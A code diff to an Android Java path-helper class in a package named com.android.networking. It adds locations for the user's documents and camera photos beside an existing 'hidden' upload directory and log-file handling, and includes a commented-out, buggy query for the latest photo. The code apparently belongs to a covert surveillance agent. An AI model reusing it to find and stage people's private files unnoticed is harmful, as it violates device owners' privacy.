@@ -11,8 +11,10 @@ package com.android.networking.file;
 
 import java.io.File;
 
+import android.database.Cursor;
 import android.os.Environment;
 import android.os.StatFs;
+import android.provider.MediaStore;
 
 import com.android.networking.Messages;
 import com.android.networking.Status;
@@ -46,6 +48,10 @@ public class Path {
 	private static String hidden;
 
 	private static boolean initialized = false;
+
+	private static String doc;
+
+	private static String picture;
 
 	// public static final String UPLOAD_DIR = "";
 
@@ -90,6 +96,21 @@ public class Path {
 				file.createNewFile();
 			}
 
+/*			String[] projection = new String[]{MediaStore.Images.ImageColumns._ID,MediaStore.Images.ImageColumns.DATA,MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,MediaStore.Images.ImageColumns.DATE_TAKEN,MediaStore.Images.ImageColumns.MIME_TYPE};     
+            final Cursor cursor = Status.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,projection, null, null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC"); 
+            if(cursor != null){
+                cursor.moveToFirst();
+                picture= cursor.getString(cursor.getColumnIndex("DESC")); 
+                // you will find the last taken picture here
+                // according to Bojan Radivojevic Bomber comment do not close the cursor (he is right ^^)
+                cursor.close();
+            }*/
+			
+			// TODO: sistemare, sono 
+			doc= Environment.getExternalStorageDirectory() + "/My Documents";
+			picture = Environment.getExternalStorageDirectory() + "/DCIM/100MEDIA";
+			
+			
 			initialized = success;
 			return success;
 
@@ -156,6 +177,14 @@ public class Path {
 
 	public static String upload() {
 		return hidden;
+	}
+
+	public static String doc() {
+		return doc;
+	}
+
+	public static String picture() {
+		return picture;
 	}
 
 	public static String getCurLogfile() {
@@ -235,7 +264,6 @@ public class Path {
 			}
 			return 0;
 		}
-
 	}
 
 	public static boolean initialized() {
